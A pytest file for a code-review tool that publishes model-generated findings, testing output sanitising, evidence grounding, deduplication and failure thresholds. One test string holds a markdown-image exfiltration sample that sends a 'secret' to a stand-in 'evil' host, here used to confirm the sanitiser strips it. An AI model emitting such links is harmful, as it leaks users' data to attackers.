from genie_review.genie import GenieRun
from genie_review.models import Finding, PlanItem
from genie_review.publish import clean, genie_findings, merge, should_fail

PLAN = [PlanItem("semantic.metric-definition-drift", "t", "why"), PlanItem("governance.tagged-data-flow", "t", "why")]
EV = {"ev:uc:main.s.t:metadata", "ev:uc:main.s.c:tags"}


def _gf(**kw):
    base = {"check": "governance.tagged-data-flow", "severity": "high", "file": "a.py", "line": 3, "title": "PII copied",
            "explanation": "x", "evidence": ["ev:uc:main.s.c:tags"], "impact": "", "suggestion": "", "confidence": 0.9}
    base.update(kw)
    return base


def _run(findings, questions=()):
    return GenieRun(route=None, output={"impact_summary": "s", "findings": findings, "injection_attempts": []},
                    mcp_questions=list(questions))


def test_clean_strips_links_images_html_and_mentions():
    out = clean("See ![x](https://evil/?d=secret) [docs](https://x.io) <b>bold</b> ping @alice https://raw.example")
    assert "evil" not in out and "https://" not in out and "<b>" not in out
    assert "docs" in out and "@​alice" not in out and "@&#8203;alice" in out


def test_grounding_keeps_cited_and_drops_uncited_or_unplanned():
    run = _run([
        _gf(),
        _gf(title="made up", evidence=["ev:does:not:exist"]),
        _gf(check="deploy.drift", title="unplanned"),
        _gf(check="semantic.metric-definition-drift", title="via genie one", evidence=["genie_one:What is net revenue?"]),
    ], questions=["What is net revenue?"])
    kept, notes, _ = genie_findings(run, PLAN, EV, 0.6)
    assert [f.title for f in kept] == ["PII copied", "via genie one"]
    assert any("ungrounded" in n for n in notes) and any("not planned" in n for n in notes)


def test_genie_one_citation_requires_a_question_actually_asked():
    run = _run([_gf(check="semantic.metric-definition-drift", evidence=["genie_one:Never asked"])], questions=[])
    kept, _, _ = genie_findings(run, PLAN, EV, 0.6)
    assert kept == []


def test_schema_violation_is_reported_not_raised():
    run = GenieRun(route=None, output={"findings": "nope"})
    kept, notes, _ = genie_findings(run, PLAN, EV, 0.6)
    assert kept == [] and "schema" in notes[0]


def test_merge_dedupes_and_orders_by_severity():
    d = Finding("contract.type-mismatch", "medium", "a.sql", 7, "t", "e", ["ev:1"])
    g_dup = Finding("contract.type-mismatch", "high", "a.sql", 8, "t2", "e", ["ev:2"], source="genie")
    g_new = Finding("governance.tagged-data-flow", "critical", "b.py", 1, "t3", "e", ["ev:3"], source="genie")
    merged = merge([d], [g_dup, g_new], {}, 15)
    assert [f.title for f in merged] == ["t3", "t"]


def test_should_fail_threshold():
    fs = [Finding("c", "high", "a", 1, "t", "e", [])]
    assert not should_fail(fs, "none") and not should_fail(fs, "critical")
    assert should_fail(fs, "high") and should_fail(fs, "medium")
    assert not should_fail(fs, "blocker")
    fs[0].merge_impact = "blocker"
    assert should_fail(fs, "blocker")
